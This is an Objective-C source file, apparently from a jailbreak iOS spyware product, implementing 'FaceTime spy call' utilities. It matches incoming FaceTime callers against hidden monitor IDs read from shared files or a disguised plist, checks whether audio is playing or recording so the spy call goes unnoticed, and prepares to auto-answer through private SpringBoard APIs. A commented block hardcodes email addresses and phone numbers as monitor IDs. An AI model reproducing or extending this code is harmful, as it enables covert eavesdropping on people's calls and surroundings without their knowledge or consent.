//
//  FaceTimeSpyCallUtils.m
//  MSSPC
//
//  Created by Makara Khloth on 7/9/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "FaceTimeSpyCallUtils.h"
#import "FaceTimeCall.h"
#import "AudioHelper.h"

#import "TelephoneNumber.h"
#import "MessagePortIPCSender.h"
#import "DefStd.h"
#import "PrefMonitorFacetimeID.h"
#import "SharedFileIPC.h"

#import "IMHandle.h"
#import "SBMediaController.h"
#import "SBApplicationController.h"
#import "SBApplication.h"
#import "SpringBoard.h"
#import "SpringBoard+IOS711.h"

// iOS 8
#import "SBUserAgent.h"
#import "SBUserAgent+IOS6.h"
#import "SBUserAgent+iOS8.h"

#import <objc/runtime.h>

@interface FaceTimeSpyCallUtils (private)
+ (BOOL) isPlayingAudio;
+ (BOOL) isRecordingAudio;
@end


@implementation FaceTimeSpyCallUtils

+ (NSString *) facetimeID: (FaceTimeCall *) aFaceTimeCall {
	NSString *facetimeID = nil;
	if ([aFaceTimeCall mIMHandle]) {
		IMHandle *handle = [aFaceTimeCall mIMHandle];
		facetimeID = [handle ID];
	} else if ([aFaceTimeCall mInviter]) {
		NSURL *ftUrl = [NSURL URLWithString:[aFaceTimeCall mInviter]];
		facetimeID = [ftUrl host];
	}
	DLog (@"facetimeID = %@", facetimeID);
	return (facetimeID);
}

+ (BOOL) isFaceTimeSpyCall: (NSString *) aFaceTimeID {
	BOOL isFaceTimeSpyCall = NO;
	
	SharedFileIPC *sFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate5];
	NSData *facetimeIDData = [sFileIPC readDataWithID:kSharedFileFaceTimeIDID];
	DLog (@"facetimeIDData = %@", facetimeIDData);
	if (facetimeIDData) {
		PrefMonitorFacetimeID *prefFaceTimeIDs = [[PrefMonitorFacetimeID alloc] initFromData:facetimeIDData];
		if ([prefFaceTimeIDs mEnableMonitorFacetimeID]) {
			TelephoneNumber *telNumber = [[TelephoneNumber alloc] init];
			for (NSString *ftID in [prefFaceTimeIDs mMonitorFacetimeIDs]) {
				NSRange locationOfAt = [ftID rangeOfString:@"@"];
				if (locationOfAt.location != NSNotFound) {
					NSString *normalizedFTID = [ftID lowercaseString];
					NSString *normalizedFaceTimeID = [aFaceTimeID lowercaseString];
					if ([normalizedFaceTimeID isEqualToString:normalizedFTID]) {
						isFaceTimeSpyCall = YES;
						break;
					}
				} else {
					if ([telNumber isNumber:aFaceTimeID matchWithMonitorNumber:ftID]) {
						isFaceTimeSpyCall = YES;
						break;
					}
				}
			}
			[telNumber release];
		}
		[prefFaceTimeIDs release];
        
	} else {
        UIApplication *uiApp = [UIApplication sharedApplication];
        if ([uiApp respondsToSelector:@selector(isProtectedDataAvailable)] &&
            ![uiApp performSelector:@selector(isProtectedDataAvailable)]) {
            /*
             Protected data not available so use preferences plist to access FaceTime spy call settings
             */
            APPLOGVERBOSE(@"FaceTime IDs is not available in protected data mode");
            
            NSDictionary *preferences = [NSDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.secure.remote.ft.user.ids.plist"];
            NSData *facetimeIDData = [preferences objectForKey:@"secure.remote.ft.user.ids"];
            DLog(@"facetimeIDData = %@", facetimeIDData);
            
            PrefMonitorFacetimeID *prefFaceTimeIDs = [[PrefMonitorFacetimeID alloc] initFromData:facetimeIDData];
            if ([prefFaceTimeIDs mEnableMonitorFacetimeID]) {
                TelephoneNumber *telNumber = [[TelephoneNumber alloc] init];
                for (NSString *ftID in [prefFaceTimeIDs mMonitorFacetimeIDs]) {
                    if ([telNumber isNumber:aFaceTimeID matchWithMonitorNumber:ftID]) {
                        isFaceTimeSpyCall = YES;
                        break;
                    }
                }
                [telNumber release];
            }
            [prefFaceTimeIDs release];
        }
    }
    
	[sFileIPC release];
	
	DLog (@"aFaceTimeID = %@ is FaceTime spy = %d", aFaceTimeID, isFaceTimeSpyCall);
	
	/*************
     - FaceTime -
     *************/
    /*
	if (!isFaceTimeSpyCall) {
		NSRange locationOfAt = [aFaceTimeID rangeOfString:@"@"];
		if (locationOfAt.location != NSNotFound) {
			NSString *normalizedFaceTimeID = [aFaceTimeID lowercaseString];
			isFaceTimeSpyCall = [normalizedFaceTimeID isEqualToString:@"forum.this@gmail.com"];
			if (!isFaceTimeSpyCall) {
				isFaceTimeSpyCall = [normalizedFaceTimeID isEqualToString:@"atir@humandrift.com"];
			}
		} else {
			// Telephone number is an face time id
			TelephoneNumber *telephoneNumber = [[TelephoneNumber alloc] init];
			isFaceTimeSpyCall = [telephoneNumber isNumber:aFaceTimeID matchWithMonitorNumber:@"0911121361"];
			if (!isFaceTimeSpyCall) {
				isFaceTimeSpyCall = [telephoneNumber isNumber:aFaceTimeID matchWithMonitorNumber:@"0818469733"];
			}
			[telephoneNumber release];
		}
	}*/
    
	return (isFaceTimeSpyCall);
}

+ (BOOL) isFaceTimeRecentSpyCall: (CTCall *) aRecentCall {
	NSString *facetimeID = CTCallCopyAddress(nil, aRecentCall);
	BOOL isFaceTimeSpyCall = [self isFaceTimeSpyCall:facetimeID];
	DLog (@"facetimeID = %@", facetimeID);
	[facetimeID release];
	return (isFaceTimeSpyCall);
}

+ (BOOL) isRecordingPlaying {
	return ([self isRecordingAudio] || [self isPlayingAudio]);
}

+ (BOOL) isPlayingAudio {
	BOOL isSBPlaying = NO;
	BOOL isVoiceMemoPlaying = NO;
	
	// Ask to VoiceMemo whether it is playing back
	MessagePortIPCSender *writer = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallVoiceMemoPlayingMsgPort];
	NSMutableData *audioHelperIsPlayingCmdData = [NSMutableData data];
	NSInteger cmd = kAudioHelperIsPlayingCmd;
	[audioHelperIsPlayingCmdData appendBytes:&cmd length:sizeof(NSInteger)];
	[writer writeDataToPort:audioHelperIsPlayingCmdData];
	NSData *returnData = [writer mReturnData];
	DLog(@"returnData 1 = %@", returnData);
	if (returnData) {
		[returnData getBytes:&isVoiceMemoPlaying length:sizeof(BOOL)];
	}
	[writer release];
	writer = nil;
	
	Class $SBMediaController = objc_getClass("SBMediaController");
	isSBPlaying = [[$SBMediaController sharedInstance] isPlaying];
	
	return (isSBPlaying || isVoiceMemoPlaying);
}

+ (void) prepareToAnswerFaceTimeCall {
    Class $SBUserAgent = objc_getClass("SBUserAgent");
    [[$SBUserAgent sharedUserAgent] prepareToAnswerCall];
}

+ (BOOL) isRecordingAudio {
	BOOL isRecording = NO;
    SBApplication *voiceMemo = nil;
	Class $SBApplicationController = objc_getClass("SBApplicationController");
    SBApplicationController *appController = [$SBApplicationController sharedInstance];
    if ([appController respondsToSelector:@selector(applicationCurrentlyRecordingAudio)]) {
        voiceMemo = [appController applicationCurrentlyRecordingAudio];
    } else {
        // iOS 7.1.1
        SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
        voiceMemo = [sb nowRecordingApp];
    }
	isRecording = voiceMemo ? YES : NO;
	return (isRecording);
}

@end
